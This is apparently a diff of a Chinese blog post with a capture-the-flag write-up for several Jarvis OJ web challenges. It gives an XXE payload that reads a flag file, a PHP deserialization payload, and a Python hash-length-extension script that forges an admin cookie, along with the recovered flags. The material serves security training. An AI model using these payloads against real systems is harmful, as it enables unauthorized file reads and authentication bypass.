 <hr>
 <h3 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h3><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
 <p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
-<p>直接能看到源码：</p>
-<pre><code class="Javascript">&lt;script&gt;
-function XHR() {
-        var xhr;
-        try {xhr = new XMLHttpRequest();}
-        catch(e) {
-            var IEXHRVers =[&quot;Msxml3.XMLHTTP&quot;,&quot;Msxml2.XMLHTTP&quot;,&quot;Microsoft.XMLHTTP&quot;];
-            for (var i=0,len=IEXHRVers.length;i&lt; len;i++) {
-                try {xhr = new ActiveXObject(IEXHRVers[i]);}
-                catch(e) {continue;}
-            }
-        }
-        return xhr;
-    }
-
-function send(){
- evil_input = document.getElementById(&quot;evil-input&quot;).value;
- var xhr = XHR();
-     xhr.open(&quot;post&quot;,&quot;/api/v1.0/try&quot;,true);
-     xhr.onreadystatechange = function () {
-         if (xhr.readyState==4 &amp;&amp; xhr.status==201) {
-             data = JSON.parse(xhr.responseText);
-             tip_area = document.getElementById(&quot;tip-area&quot;);
-             tip_area.value = data.task.search+data.task.value;
-         }
-     };
-     xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;);
-     xhr.send(&#39;{&quot;search&quot;:&quot;&#39;+evil_input+&#39;&quot;,&quot;value&quot;:&quot;own&quot;}&#39;);
-}
-&lt;/script&gt;
-</code></pre>
+<p>直接能看到源码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>光看这个没找到什么特别的东西，搜了一些资料发现这题是关于 <a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">XXE漏洞</a> ，简单地说就是利用 <code>xml</code> 中的 <code>Entity</code> 实体来读取文件或者执行系统命令等，以造成攻击。  </p>
 <p>这题里先把 <code>Content-Type</code> 改成 <code>application/xml</code>，然后构造：</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xdsec [
-&lt;!ELEMENT methodname ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;/home/ctf/flag.txt&quot; &gt;]&gt;
-&lt;methodcall&gt;
-&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
-&lt;/methodcall&gt;
-</code></pre>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT methodname ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "/home/ctf/flag.txt" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>就可以获取flag了。</p>
 <hr>
 <h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p>
 <p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p>
 <p>扫了一下目录，只发现了 <code>showing.php</code> 和 <code>index.php</code>。</p>
 <p>查看源码发现</p>
-<pre><code class="HTML">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>感觉像文件包含，但是现在除了这张图外没有别的能利用的东西，试着读取 <code>showing.php</code> 本身：</p>
 <p><img src="/2017/11/04/jarvisoj-wp/1.png" alt=""></p>
 <p>可以看到源码，过滤了 <code>pctf</code> 。但是没什么利用方式，如果直接查看 <code>/pctf.php</code> 拿到的是假flag。同样的方式读取 <code>index.php</code>：</p>
-<pre><code class="PHP">&lt;?php 
-    require_once(&#39;shield.php&#39;);
-    $x = new Shield();
-    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
-    if (!empty($g)) {
-        $x = unserialize($g);
-    }
-    echo $x-&gt;readfile();
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>然后拿到 <code>shield.php</code> 的源码：</p>
-<pre><code class="PHP">&lt;?php
-    //flag is in pctf.php
-    class Shield {
-        public $file;
-        function __construct($filename = &#39;&#39;) {
-            $this -&gt; file = $filename;
-        }
-
-        function readfile() {
-            if (!empty($this-&gt;file) 
-            &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
-            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE
-            &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
-                return @file_get_contents($this-&gt;file);
-            }
-        }
-    }
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//flag is in pctf.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><code>shield.php</code> 中说flag在 <code>pctf.php</code> 里，但是在 <code>showing.php</code> 中被过滤了，所以直接读它拿到的是假flag。留意到 <code>index.php</code> 里用了反序列化，可以利用这点构造payload：</p>
-<pre><code class="PHP">&lt;?php
-    class Shield {
-        public $file;
-        function __construct($filename = &#39;&#39;) {
-            $this -&gt; file = $filename;
-        }
-    }
-    $a = new Shield();
-    $a-&gt;file = &quot;pctf.php&quot;;
-    echo serialize($a);
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> Shield();</span><br><span class="line">    $a-&gt;file = <span class="string">"pctf.php"</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>序列化后的结果为：</p>
-<pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}
-</code></pre><p>利用 <code>index.php</code> 中的 <code>class</code> 参数传入payload然后再反序列化就可以拿到flag了。</p>
-<pre><code>http://web.jarvisoj.com:32768/?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}
-</code></pre><pre><code class="HTML">&lt;!--?php 
-    //Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
-    //Fake flag:
-    echo &quot;FLAG: PCTF{I_4m_not_fl4g}&quot;
-?--&gt;
-</code></pre>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"Shield"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>利用 <code>index.php</code> 中的 <code>class</code> 参数传入payload然后再反序列化就可以拿到flag了。</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:<span class="number">32768</span>/?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?php </span></span><br><span class="line"><span class="comment">    //Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span></span><br><span class="line"><span class="comment">    //Fake flag:</span></span><br><span class="line"><span class="comment">    echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"</span></span><br><span class="line"><span class="comment">?--&gt;</span></span><br></pre></td></tr></table></figure>
 <hr>
 <h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>只有管理员才能获得flag，你能想办法获得吗？</p>
 <p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p>
 <p>vim备份文件泄露（ <code>/index.php~</code> ），恢复后拿到源码（题目有点问题，<code>vim -r</code> 一直失败，想强行手动恢复但是感觉没啥意义…就直接搜了原题的源码贴上来了）</p>
-<pre><code class="PHP">&lt;html&gt;  
-    &lt;head&gt;
-        &lt;title&gt;Web 350&lt;/title&gt;
-        &lt;style type=&quot;text/css&quot;&gt;
-            body {
-                background:gray;
-                text-align:center;  
-            }
-        &lt;/style&gt;
-    &lt;/head&gt; 
-    &lt;body&gt;
-        &lt;?php
-            $auth = false;
-            $role = &quot;guest&quot;;   
-            $salt = ;
-            if (isset($_COOKIE[&quot;role&quot;])) {
-                $role = unserialize($_COOKIE[&quot;role&quot;]);
-                $hsh = $_COOKIE[&quot;hsh&quot;];
-                if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) {    
-                    $auth = true;
-                }
-                else {
-                    $auth = false;
-                } else {}   
-                $s = serialize($role);
-                setcookie(&#39;role&#39;,$s);
-                $hsh = md5($salt.strrev($s));
-                setcookie(&#39;hsh&#39;,$hsh);
-            }
-            if ($auth) {
-                echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;
-            } 
-            else {
-                echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;  
-            }
-        ?&gt;  
-    &lt;/body&gt; 
-&lt;/html&gt;
-</code></pre>
-<p>核心语句为：</p>
-<pre><code>$role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))
-</code></pre><p>查了些资料，发现可以使用 <code>哈希长度扩展攻击</code> 。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</span><br><span class="line">        &lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">            body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;  </span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt; </span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            $auth = <span class="keyword">false</span>;</span><br><span class="line">            $role = <span class="string">"guest"</span>;   </span><br><span class="line">            $salt = ;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">                $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">                $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">                <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </span><br><span class="line">                    $auth = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    $auth = <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;&#125;   </span><br><span class="line">                $s = serialize($role);</span><br><span class="line">                setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">                $hsh = md5($salt.strrev($s));</span><br><span class="line">                setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;  </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span>  </span><br><span class="line">    &lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>核心语句为：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">role===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))</span></span><br></pre></td></tr></table></figure></p>
+<p>查了些资料，发现可以使用 <code>哈希长度扩展攻击</code> 。</p>
 <p>做题的时候整理了一下这里涉及的知识点 - <a href="http://blog.cyris.cn/2018/02/02/hash-extender-attack/" target="_blank" rel="noopener">传送门</a></p>
 <p>利用工具：</p>
 <blockquote>
 <p><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">HashPump</a><br><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">hash_extender</a></p>
 </blockquote>
-<p>已有条件：</p>
-<pre><code>Cookie-hsh：3a4727d57463f122833d9e732f94e4e0
-Cookie-role：s%3A5%3A%22guest%22%3B
-需要求：md5(salt+strrev(admin))
-* salt长度未知
-</code></pre><p>这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本：</p>
-<pre><code class="Python">from urlparse import urlparse
-from httplib import HTTPConnection
-from urllib import urlencode
-import json
-import time
-import os
-import urllib
-def gao(x, y):
-        #print x
-        #print y
-    url = &quot;http://web.jarvisoj.com:32778/index.php&quot;
-    cookie = &quot;role=&quot; + x + &quot;; hsh=&quot; + y
-        #print cookie
-    build_header = {
-            &#39;Cookie&#39;: cookie,
-            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0&#39;,
-            &#39;Host&#39;: &#39;web.jarvisoj.com:32778&#39;,
-            &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
-    }
-    urlparts = urlparse(url)
-    conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
-    conn.request(&quot;GET&quot;, urlparts.path, &#39;&#39;, build_header)
-    resp = conn.getresponse()
-    body = resp.read()
-    return body
-for i in xrange(1000):
-    print i
-    # secret len = ???
-    find_hash = &quot;./hash_extender -d &#39;;\&quot;tseug\&quot;:5:s&#39; -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a &#39;;\&quot;nimda\&quot;:5:s&#39; --out-data-format=html -l &quot; + str(i) + &quot; --quiet&quot;
-    #print find_hash
-    calc_res = os.popen(find_hash).readlines()
-    hash_value = calc_res[0][:32]
-    attack_padding = calc_res[0][32:]
-    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
-    ret = gao(attack_padding, hash_value)
-    if &quot;Welcome&quot; in ret:
-        print ret
-        break
-</code></pre>
+<p>已有条件：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie-hsh：<span class="number">3</span>a<span class="number">4727</span>d<span class="number">57463</span>f<span class="number">122833</span>d<span class="number">9</span>e<span class="number">732</span>f<span class="number">94</span>e<span class="number">4</span>e<span class="number">0</span></span><br><span class="line">Cookie-role：s<span class="meta">%</span><span class="number">3</span>A<span class="number">5</span><span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span><span class="number">22</span>guest<span class="meta">%</span><span class="number">22</span><span class="meta">%</span><span class="number">3</span>B</span><br><span class="line">需要求：md<span class="number">5</span><span class="comment">(salt+strrev(admin)</span>)</span><br><span class="line">* salt长度未知</span><br></pre></td></tr></table></figure></p>
+<p>这里我用的是 hash_extender （需要make一下），因为 mac 最新的 openssl 库就是装不上….丢去服务器上跑了，salt 长度未知，贴一份脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> httplib <span class="keyword">import</span> HTTPConnection</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gao</span><span class="params">(x, y)</span>:</span></span><br><span class="line">        <span class="comment">#print x</span></span><br><span class="line">        <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">"; hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="keyword">or</span> <span class="number">80</span>)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="keyword">return</span> body</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[<span class="number">0</span>][:<span class="number">32</span>]</span><br><span class="line">    attack_padding = calc_res[<span class="number">0</span>][<span class="number">32</span>:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::<span class="number">-1</span>])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="keyword">print</span> ret</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>得到回显：</p>
-<pre><code class="HTML">...
-12
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-&lt;title&gt;Web 350&lt;/title&gt;
-&lt;style type=&quot;text/css&quot;&gt;
-    body {
-        background:gray;
-        text-align:center;
-    }
-&lt;/style&gt;
-&lt;/head&gt;
-
-&lt;body&gt;
-    &lt;h3&gt;Welcome Admin. Your flag is PCTF{H45h_ext3ndeR_i5_easy_to_us3} &lt;/h3&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">12</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span 